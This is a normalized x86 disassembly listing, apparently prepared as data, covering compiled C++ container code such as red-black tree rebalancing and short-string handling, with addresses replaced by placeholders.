cmp [ esi + 0x44 ] 0x0
jne r-xdata
mov esi [ esi + 0x8 ]
cmp [ esi + 0x44 ] 0x0
je r-xdata
cmp eax [ edx ]
jne r-xdata
mov [ edx + 0x44 ] bl
mov [ esi + 0x44 ] bl
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x44 ] 0x0
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x4 ]
jmp r-xdata
cmp eax [ edx + 0x8 ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov [ edx + 0x44 ] bl
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x44 ] 0x0
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx + 0x8 ]
mov edi [ esi ]
mov [ edx + 0x8 ] edi
mov edi [ esi ]
cmp [ edi + 0x45 ] 0x0
jne r-xdata
mov eax edx
mov edx [ eax ]
mov esi [ edx + 0x8 ]
mov [ eax ] esi
mov esi [ edx + 0x8 ]
cmp [ esi + 0x45 ] 0x0
jne r-xdata
mov edx [ eax + 0x4 ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
mov edx [ eax + 0x4 ]
mov [ edx + 0x44 ] bl
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x44 ] 0x0
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx ]
mov edi [ esi + 0x8 ]
mov [ edx ] edi
mov edi [ esi + 0x8 ]
cmp [ edi + 0x45 ] 0x0
jne r-xdata
mov eax edx
mov edx [ eax + 0x8 ]
mov esi [ edx ]
mov [ eax + 0x8 ] esi
mov esi [ edx ]
cmp [ esi + 0x45 ] 0x0
jne r-xdata
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ecx + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ eax + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ ecx + 0x4 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] eax
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ecx + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ eax + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ ecx + 0x4 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] eax
mov edi [ edx + 0x4 ]
cmp edx [ edi ]
jne r-xdata
mov [ edi + 0x4 ] esi
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov edi [ edx + 0x4 ]
cmp edx [ edi + 0x8 ]
jne r-xdata
mov [ edi + 0x4 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp eax [ esi ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ edi ] esi
jmp r-xdata
mov [ esi ] edx
mov [ esi ] edx
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edx + 0x8 ] eax
mov [ eax + 0x4 ] edx
mov [ edi ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov edi [ ebp + 0x14 ]
mov [ edx + 0x4 ] esi
mov [ esi + 0x8 ] edx
mov [ esi ] edx
jmp r-xdata
mov [ edx ] eax
mov [ eax + 0x4 ] edx
sub_402fd0
push ebp
mov ebp esp
push 0xffffffff
push sub_413739
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
mov esp ebp
pop ebp
retn 0x8
push edi
mov edi [ ebp + 0xc ]
push 0xffffffff
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push edi
mov ecx esi
mov [ esi ] 0x0
call sub_401ea0
push 0xffffffff
lea ecx [ esi + 0x1c ]
push 0x0
add edi 0x1c
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push edi
mov [ ebp - 0x4 ] 0x1
mov [ ecx ] 0x0
call sub_401ea0
pop edi
sub_403060
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
cmp [ edi + 0x45 ] 0x0
mov [ ebp - 0x4 ] ecx
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_401520
mov ecx [ edi ]
cmp [ ecx + 0x45 ] 0x0
je r-xdata
push r--data
call sub_404635
mov eax [ edi + 0x8 ]
cmp [ eax + 0x45 ] 0x0
je r-xdata
mov ebx [ edi + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ebx [ eax + 0x8 ]
cmp eax edi
jne r-xdata
mov ebx ecx
jmp r-xdata
cmp [ ebx + 0x45 ] 0x0
mov esi [ edi + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov ecx [ edi ]
mov [ eax ] ecx
cmp eax [ edi + 0x8 ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x4 ] edi
jne r-xdata
mov [ ebx + 0x4 ] esi
cmp [ ebx + 0x45 ] 0x0
mov esi [ eax + 0x4 ]
jne r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] edi
jne r-xdata
mov [ eax + 0x4 ] ebx
jmp r-xdata
mov [ esi ] ebx
mov ecx [ edi + 0x8 ]
mov [ eax + 0x8 ] ecx
mov edx [ edi + 0x8 ]
mov [ edx + 0x4 ] eax
mov [ ebx + 0x4 ] esi
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x4 ] edi
jne r-xdata
mov [ esi + 0x8 ] ebx
mov [ esi ] ebx
jmp r-xdata
mov eax [ ecx + 0x4 ]
cmp [ eax ] edi
jne r-xdata
mov ecx [ edi + 0x4 ]
cmp [ ecx ] edi
jne r-xdata
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x8 ] edi
jne r-xdata
cmp [ ebx + 0x45 ] 0x0
je r-xdata
mov [ ecx + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
mov cl [ eax + 0x44 ]
mov dl [ edi + 0x44 ]
mov [ eax + 0x44 ] dl
mov [ edi + 0x44 ] cl
mov ecx [ ebp - 0x4 ]
cmp [ edi + 0x44 ] 0x1
jne r-xdata
cmp [ ebx + 0x45 ] 0x0
je r-xdata
push ebx
call sub_401140
mov ecx [ ebp - 0x4 ]
add esp 0x4
mov eax esi
jmp r-xdata
cmp [ edi + 0x3c ] 0x10
jb r-xdata
mov eax [ ecx + 0x4 ]
cmp ebx [ eax + 0x4 ]
je r-xdata
push ebx
call sub_401220
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x4 ]
add esp 0x4
mov [ edx + 0x8 ] eax
jmp r-xdata
mov edx [ ecx + 0x4 ]
mov eax esi
mov [ edx + 0x8 ] eax
jmp r-xdata
mov edx [ ecx + 0x4 ]
mov [ edx ] eax
xor esi esi
mov ebx 0xf
mov [ edi + 0x3c ] ebx
mov [ edi + 0x38 ] esi
mov [ edi + 0x28 ] 0x0
cmp [ edi + 0x20 ] 0x10
jb r-xdata
mov ecx [ edi + 0x28 ]
push ecx
call sub_406807
add esp 0x4
mov [ ebx + 0x44 ] 0x1
cmp [ ebx + 0x44 ] 0x1
jne r-xdata
mov [ edi + 0x20 ] ebx
mov [ edi + 0x1c ] esi
push edi
mov [ edi + 0xc ] 0x0
call sub_406807
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x8 ]
add esp 0x4
pop edi
cmp eax esi
pop esi
pop ebx
jbe r-xdata
mov edx [ edi + 0xc ]
push edx
call sub_406807
add esp 0x4
mov eax [ esi ]
cmp ebx eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
mov esp ebp
pop ebp
retn 0x8
dec eax
mov [ ecx + 0x8 ] eax
cmp [ eax + 0x44 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax + 0x44 ] 0x0
jne r-xdata
cmp [ eax + 0x45 ] 0x0
jne r-xdata
mov [ eax + 0x44 ] 0x1
push esi
mov [ esi + 0x44 ] 0x0
call sub_4011c0
mov eax [ esi ]
mov ecx [ ebp - 0x4 ]
cmp [ eax + 0x45 ] 0x0
jne r-xdata
mov [ eax + 0x44 ] 0x1
push esi
mov [ esi + 0x44 ] 0x0
call sub_401650
mov eax [ esi + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x4 ]
mov ebx esi
mov esi [ esi + 0x4 ]
cmp ebx [ eax + 0x4 ]
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0x44 ] 0x1
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x44 ] 0x1
jne r-xdata
jmp r-xdata
mov edx [ eax ]
cmp [ edx + 0x44 ] 0x1
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x44 ] 0x1
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0x44 ] 0x1
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0x44 ] 0x1
je r-xdata
mov dl [ esi + 0x44 ]
mov [ eax + 0x44 ] dl
mov [ esi + 0x44 ] 0x1
mov eax [ eax ]
push esi
mov [ eax + 0x44 ] 0x1
call sub_4011c0
mov edx [ eax + 0x8 ]
mov [ edx + 0x44 ] 0x1
push eax
mov [ eax + 0x44 ] 0x0
call sub_401650
mov eax [ esi ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x44 ] 0x0
mov dl [ esi + 0x44 ]
mov [ eax + 0x44 ] dl
mov [ esi + 0x44 ] 0x1
mov eax [ eax + 0x8 ]
push esi
mov [ eax + 0x44 ] 0x1
call sub_401650
jmp r-xdata
mov edx [ eax ]
mov [ edx + 0x44 ] 0x1
push eax
mov [ eax + 0x44 ] 0x0
call sub_4011c0
mov eax [ esi + 0x8 ]
mov ecx [ ebp - 0x4 ]
sub_403300
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
mov [ ebp - 0x4 ] ecx
mov edi esi
cmp [ esi + 0x45 ] bl
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ edi + 0x8 ]
mov ecx [ ebp - 0x4 ]
push eax
call sub_403300
cmp [ esi + 0x3c ] 0x10
mov edi [ edi ]
jb r-xdata
mov [ esi + 0x3c ] 0xf
mov [ esi + 0x38 ] ebx
mov [ esi + 0x28 ] bl
cmp [ esi + 0x20 ] 0x10
jb r-xdata
mov ecx [ esi + 0x28 ]
push ecx
call sub_406807
add esp 0x4
mov [ esi + 0x20 ] 0xf
mov [ esi + 0x1c ] ebx
push esi
mov [ esi + 0xc ] bl
call sub_406807
add esp 0x4
mov esi edi
cmp [ edi + 0x45 ] bl
je r-xdata
mov edx [ esi + 0xc ]
push edx
call sub_406807
add esp 0x4
sub_403380
push ebp
mov ebp esp
push 0xffffffff
push sub_413769
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ ebp - 0x10 ] 0x0
push esi
mov esi [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push edi
mov [ esi ] 0x0
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov eax [ eax + 0x10 ]
mov ecx [ ecx + 0x10 ]
mov edi [ esi + 0x10 ]
add eax ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
cmp edi eax
ja r-xdata
mov edx [ ebp + 0xc ]
push 0xffffffff
push 0x0
push edx
mov ecx esi
call sub_4019e0
mov eax [ ebp + 0x10 ]
push 0xffffffff
push 0x0
push eax
mov ecx esi
call sub_4019e0
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
mov esp ebp
pop ebp
retn
cmp [ esi + 0x14 ] eax
je r-xdata
push 0x1
push eax
mov ecx esi
call sub_4018e0
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + edi ] 0x0
sub_403430
push ebp
mov ebp esp
sub esp 0x8
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi ecx
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x4 ]
mov ecx eax
add ebx 0xc
cmp [ esi + 0x45 ] 0x0
mov al 0x1
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] al
jne r-xdata
mov esi ecx
mov [ ebp + 0x10 ] esi
test al al
je r-xdata
cmp [ ebp + 0x10 ] 0x0
mov [ ebp - 0x4 ] esi
je r-xdata
push ebx
lea eax [ esi + 0xc ]
push eax
mov ecx edi
call sub_402aa0
test al al
je r-xdata
mov edx [ edi + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
lea ecx [ esi + 0xc ]
push ecx
push ebx
mov ecx edi
call sub_402aa0
push ebx
lea eax [ esi + 0xc ]
push eax
mov ecx edi
call sub_402aa0
test al al
sete al
jmp r-xdata
push ebx
add edi 0xd
push edi
call sub_402d20
mov eax [ ebp + 0xc ]
push eax
call sub_406807
mov eax [ ebp + 0x8 ]
add esp 0xc
pop edi
mov [ eax ] esi
pop esi
mov [ eax + 0x4 ] 0x0
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
push ecx
push edx
push eax
jmp r-xdata
lea ecx [ ebp + 0x10 ]
call sub_401260
mov esi [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push eax
push ecx
push 0x1
mov esi [ esi + 0x8 ]
mov esi [ esi ]
jmp r-xdata
mov [ ebp - 0x8 ] al
test al al
je r-xdata
lea ecx [ ebp + 0x10 ]
push ecx
mov ecx edi
call sub_402d70
mov edx [ eax ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
mov [ eax ] edx
mov [ eax + 0x4 ] 0x1
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp - 0x4 ]
cmp [ esi + 0x45 ] 0x0
je r-xdata
sub_403520
push ebp
mov ebp esp
push 0xffffffff
push sub_413780
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x14
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push 0x48
mov edi ecx
call sub_406c0a
mov esi eax
xor eax eax
add esp 0x4
mov [ ebp - 0x14 ] esi
cmp esi eax
je r-xdata
lea edx [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x20 ]
mov [ ebp + 0x8 ] eax
call sub_406719
push r--data
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x20 ] r--data
call sub_406c8a
int3
mov ecx [ edi + 0x4 ]
mov [ esi ] ecx
mov edx [ edi + 0x4 ]
mov [ esi + 0x4 ] edx
mov ecx [ edi + 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ esi + 0x44 ] ax
mov [ ebp - 0x4 ] eax
push edx
lea eax [ esi + 0xc ]
mov [ esi + 0x8 ] ecx
push eax
lea ecx [ edi + 0xd ]
call sub_402fd0
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4035d0
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x10 ]
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ ebp + 0xc ]
cmp ecx [ eax ]
jne r-xdata
cmp ecx edx
je r-xdata
cmp edx eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
cmp [ ecx + 0x45 ] 0x0
mov edx ecx
jne r-xdata
mov eax [ eax + 0x4 ]
push eax
mov ecx esi
call sub_403300
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov ecx [ esi + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ esi + 0x8 ] 0x0
mov edx [ ecx ]
mov [ eax ] edx
pop esi
mov esp ebp
pop ebp
retn 0xc
push edx
lea eax [ ebp - 0x4 ]
push eax
mov ecx esi
call sub_403060
mov ecx [ ebp + 0xc ]
cmp ecx [ ebp + 0x10 ]
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x45 ] 0x0
jne r-xdata
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x45 ] 0x0
jne r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x45 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov [ ebp + 0xc ] ecx
jmp r-xdata
jmp r-xdata
mov ecx eax
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
cmp [ eax + 0x45 ] 0x0
je r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x45 ] 0x0
je r-xdata
sub_403690
push ebp
mov ebp esp
push 0xffffffff
push sub_413798
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ ebp - 0x14 ]
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x0
call sub_4035d0
mov ecx [ esi + 0x4 ]
push ecx
call sub_406807
mov ecx [ ebp - 0xc ]
add esp 0x4
pop esi
mov [ fs : 0x0 ] ecx
mov esp ebp
pop ebp
retn
sub_4036f0
push ebp
mov ebp esp
push 0xffffffff
push sub_4138d3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x220
push ebx
push esi
push edi
push 0x8
xor ebx ebx
mov esi 0xf
push r--data
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] bl
call sub_402000
push 0x7
push r--data
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x38 ] bl
call sub_402000
push 0xffffffff
push ebx
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x220 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x20c ] esi
mov [ ebp - 0x210 ] ebx
mov [ ebp - 0x220 ] bl
call sub_401ea0
push 0xffffffff
push ebx
lea ecx [ ebp - 0x54 ]
push ecx
lea ecx [ ebp - 0x204 ]
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1f0 ] esi
mov [ ebp - 0x1f4 ] ebx
mov [ ebp - 0x204 ] bl
call sub_401ea0
mov edi 0x10
cmp [ ebp - 0x24 ] edi
jb r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x38 ] bl
mov [ ebp - 0x4 ] 0x5
cmp [ ebp - 0x40 ] edi
jb r-xdata
mov edx [ ebp - 0x38 ]
push edx
call sub_406807
add esp 0x4
push 0x8
push r--data
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] bl
mov [ ebp - 0x64 ] esi
mov [ ebp - 0x68 ] ebx
mov [ ebp - 0x78 ] bl
call sub_402000
push 0x4
push r--data
lea ecx [ ebp - 0x94 ]
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x80 ] esi
mov [ ebp - 0x84 ] ebx
mov [ ebp - 0x94 ] bl
call sub_402000
push 0xffffffff
push ebx
lea ecx [ ebp - 0x94 ]
push ecx
lea ecx [ ebp - 0x1e8 ]
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x1d4 ] esi
mov [ ebp - 0x1d8 ] ebx
mov [ ebp - 0x1e8 ] bl
call sub_401ea0
push 0xffffffff
push ebx
lea edx [ ebp - 0x78 ]
push edx
lea ecx [ ebp - 0x1cc ]
mov [ ebp - 0x4 ] 0x8
mov [ ebp - 0x1b8 ] esi
mov [ ebp - 0x1bc ] ebx
mov [ ebp - 0x1cc ] bl
call sub_401ea0
cmp [ ebp - 0x80 ] edi
jb r-xdata
mov eax [ ebp - 0x54 ]
push eax
call sub_406807
add esp 0x4
mov [ ebp - 0x80 ] esi
mov [ ebp - 0x84 ] ebx
mov [ ebp - 0x94 ] bl
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x64 ] edi
jb r-xdata
mov eax [ ebp - 0x94 ]
push eax
call sub_406807
add esp 0x4
push 0x8
push r--data
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x64 ] esi
mov [ ebp - 0x68 ] ebx
mov [ ebp - 0x78 ] bl
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x38 ] bl
call sub_402000
push 0x5
push r--data
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0xc
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] bl
call sub_402000
push 0xffffffff
push ebx
lea edx [ ebp - 0x54 ]
push edx
lea ecx [ ebp - 0x178 ]
mov [ ebp - 0x4 ] 0xd
mov [ ebp - 0x164 ] esi
mov [ ebp - 0x168 ] ebx
mov [ ebp - 0x178 ] bl
call sub_401ea0
push 0xffffffff
push ebx
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x15c ]
mov [ ebp - 0x4 ] 0xe
mov [ ebp - 0x148 ] esi
mov [ ebp - 0x14c ] ebx
mov [ ebp - 0x15c ] bl
call sub_401ea0
cmp [ ebp - 0x40 ] edi
jb r-xdata
mov ecx [ ebp - 0x78 ]
push ecx
call sub_406807
add esp 0x4
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] bl
mov [ ebp - 0x4 ] 0x11
cmp [ ebp - 0x24 ] edi
jb r-xdata
mov ecx [ ebp - 0x54 ]
push ecx
call sub_406807
add esp 0x4
push 0x8
push r--data
lea ecx [ ebp - 0x94 ]
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x38 ] bl
mov [ ebp - 0x80 ] esi
mov [ ebp - 0x84 ] ebx
mov [ ebp - 0x94 ] bl
call sub_402000
push 0x5
push r--data
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x4 ] 0x12
mov [ ebp - 0x64 ] esi
mov [ ebp - 0x68 ] ebx
mov [ ebp - 0x78 ] bl
call sub_402000
push 0xffffffff
push ebx
lea eax [ ebp - 0x78 ]
push eax
lea ecx [ ebp - 0x108 ]
mov [ ebp - 0x4 ] 0x13
mov [ ebp - 0xf4 ] esi
mov [ ebp - 0xf8 ] ebx
mov [ ebp - 0x108 ] bl
call sub_401ea0
push 0xffffffff
push ebx
lea ecx [ ebp - 0x94 ]
push ecx
lea ecx [ ebp - 0xec ]
mov [ ebp - 0x4 ] 0x14
mov [ ebp - 0xd8 ] esi
mov [ ebp - 0xdc ] ebx
mov [ ebp - 0xec ] bl
call sub_401ea0
cmp [ ebp - 0x64 ] edi
jb r-xdata
mov edx [ ebp - 0x38 ]
push edx
call sub_406807
add esp 0x4
mov [ ebp - 0x64 ] esi
mov [ ebp - 0x68 ] ebx
mov [ ebp - 0x78 ] bl
mov [ ebp - 0x4 ] 0x17
cmp [ ebp - 0x80 ] edi
jb r-xdata
mov edx [ ebp - 0x78 ]
push edx
call sub_406807
add esp 0x4
push 0x4
push r--data
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x80 ] esi
mov [ ebp - 0x84 ] ebx
mov [ ebp - 0x94 ] bl
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x38 ] bl
call sub_402000
push 0x5
push r--data
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x18
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] bl
call sub_402000
push 0xffffffff
push ebx
lea ecx [ ebp - 0x54 ]
push ecx
lea ecx [ ebp - 0x1b0 ]
mov [ ebp - 0x4 ] 0x19
mov [ ebp - 0x19c ] esi
mov [ ebp - 0x1a0 ] ebx
mov [ ebp - 0x1b0 ] bl
call sub_401ea0
push 0xffffffff
push ebx
lea edx [ ebp - 0x38 ]
push edx
lea ecx [ ebp - 0x194 ]
mov [ ebp - 0x4 ] 0x1a
mov [ ebp - 0x180 ] esi
mov [ ebp - 0x184 ] ebx
mov [ ebp - 0x194 ] bl
call sub_401ea0
cmp [ ebp - 0x40 ] edi
jb r-xdata
mov eax [ ebp - 0x94 ]
push eax
call sub_406807
add esp 0x4
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] bl
mov [ ebp - 0x4 ] 0x1d
cmp [ ebp - 0x24 ] edi
jb r-xdata
mov eax [ ebp - 0x54 ]
push eax
call sub_406807
add esp 0x4
push 0x3
push r--data
lea ecx [ ebp - 0x94 ]
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x38 ] bl
mov [ ebp - 0x80 ] esi
mov [ ebp - 0x84 ] ebx
mov [ ebp - 0x94 ] bl
call sub_402000
push 0x5
push r--data
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x4 ] 0x1e
mov [ ebp - 0x64 ] esi
mov [ ebp - 0x68 ] ebx
mov [ ebp - 0x78 ] bl
call sub_402000
push 0xffffffff
push ebx
lea edx [ ebp - 0x78 ]
push edx
lea ecx [ ebp - 0xd0 ]
mov [ ebp - 0x4 ] 0x1f
mov [ ebp - 0xbc ] esi
mov [ ebp - 0xc0 ] ebx
mov [ ebp - 0xd0 ] bl
call sub_401ea0
push 0xffffffff
push ebx
lea eax [ ebp - 0x94 ]
push eax
lea ecx [ ebp - 0xb4 ]
mov [ ebp - 0x4 ] 0x20
mov [ ebp - 0xa0 ] esi
mov [ ebp - 0xa4 ] ebx
mov [ ebp - 0xb4 ] bl
call sub_401ea0
cmp [ ebp - 0x64 ] edi
jb r-xdata
mov ecx [ ebp - 0x38 ]
push ecx
call sub_406807
add esp 0x4
mov [ ebp - 0x64 ] esi
mov [ ebp - 0x68 ] ebx
mov [ ebp - 0x78 ] bl
mov [ ebp - 0x4 ] 0x23
cmp [ ebp - 0x80 ] edi
jb r-xdata
mov ecx [ ebp - 0x78 ]
push ecx
call sub_406807
add esp 0x4
push 0x5
push r--data
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x80 ] esi
mov [ ebp - 0x84 ] ebx
mov [ ebp - 0x94 ] bl
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x38 ] bl
call sub_402000
push 0x5
push r--data
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x24
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] bl
call sub_402000
push 0xffffffff
push ebx
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x140 ]
mov [ ebp - 0x4 ] 0x25
mov [ ebp - 0x12c ] esi
mov [ ebp - 0x130 ] ebx
mov [ ebp - 0x140 ] bl
call sub_401ea0
push 0xffffffff
push ebx
lea ecx [ ebp - 0x38 ]
push ecx
lea ecx [ ebp - 0x124 ]
mov [ ebp - 0x4 ] 0x26
mov [ ebp - 0x110 ] esi
mov [ ebp - 0x114 ] ebx
mov [ ebp - 0x124 ] bl
call sub_401ea0
cmp [ ebp - 0x40 ] edi
jb r-xdata
mov edx [ ebp - 0x94 ]
push edx
call sub_406807
add esp 0x4
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] bl
mov [ ebp - 0x4 ] 0x29
cmp [ ebp - 0x24 ] edi
jb r-xdata
mov edx [ ebp - 0x54 ]
push edx
call sub_406807
add esp 0x4
push 0x48
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x38 ] bl
mov [ ebp - 0x14 ] ebx
call sub_406c0a
add esp 0x4
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x38 ]
push eax
call sub_406807
add esp 0x4
lea eax [ ebp - 0x98 ]
push eax
lea ecx [ ebp - 0x22c ]
mov [ ebp - 0x98 ] ebx
call sub_406719
push r--data
lea ecx [ ebp - 0x22c ]
push ecx
mov [ ebp - 0x22c ] r--data
call sub_406c8a
int3
mov [ ebp - 0x18 ] eax
mov [ eax ] eax
mov eax [ ebp - 0x18 ]
mov [ eax + 0x4 ] eax
mov eax [ ebp - 0x18 ]
mov [ eax + 0x8 ] eax
mov ecx [ ebp - 0x18 ]
mov [ ecx + 0x44 ] 0x1
mov edx [ ebp - 0x18 ]
